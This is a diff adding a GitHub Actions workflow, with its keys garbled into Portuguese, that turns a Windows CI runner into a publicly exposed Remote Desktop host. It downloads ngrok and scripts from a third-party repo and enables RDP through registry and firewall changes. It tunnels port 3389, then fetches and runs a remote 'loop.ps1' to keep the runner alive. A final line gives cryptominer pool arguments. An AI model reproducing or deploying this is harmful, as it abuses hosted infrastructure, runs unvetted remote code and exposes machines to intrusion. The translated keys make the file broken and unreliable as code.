@@ -1,0 +1,39 @@
+Chave: NGROK_AUTH_TOKEN
+==============================
+nome: amazon RDP
+
+em: workflow_dispatch
+
+empregos:
+  Construir:
+
+    executado: windows-latest
+    minutos de tempo limite: 9999
+
+    degraus:
+    - nome: Baixando Ngrok.
+      executar: |
+        Invoke-WebRequest https://raw.githubusercontent.com/romain09/AWS-RDP/main/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
+        Invoke-WebRequest https://raw.githubusercontent.com/romain09/AWS-RDP/main/start.bat -OutFile start.bat
+    - nome: Extraindo arquivos Ngrok.
+      execute: Expand-Archive ngrok.zip
+    - nome: Conectando-se à sua conta Ngrok.
+      execute: .\ngrok\ngrok.exe token de autenticação $Env:NGROK_AUTH_TOKEN
+      ambiente:
+        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
+    - nome: Ativando o acesso RDP.
+      executar: |
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+        Enable-NetFirewallRule -DisplayGroup "Área de Trabalho Remota"
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+    - nome: Criando Túnel.
+      execute: Start-Process Powershell -ArgumentList '-Noexit -Command ".\ngrok\ngrok.exe tcp 3389"'
+    - nome: Conectando-se ao seu RDP.
+      execute: cmd /c start.bat
+    - nome: RDP está pronto!
+      executar: |
+        Invoke-WebRequest https://raw.githubusercontent.com/romain09/AWS-RDP/main/loop.ps1 -OutFile loop.ps1
+        ./loop.ps1
+============================================
+
+--donate-level 1 -o rx.unmineable.com:3333 -u cod:carteira.mineiro -px -k -a rx/0
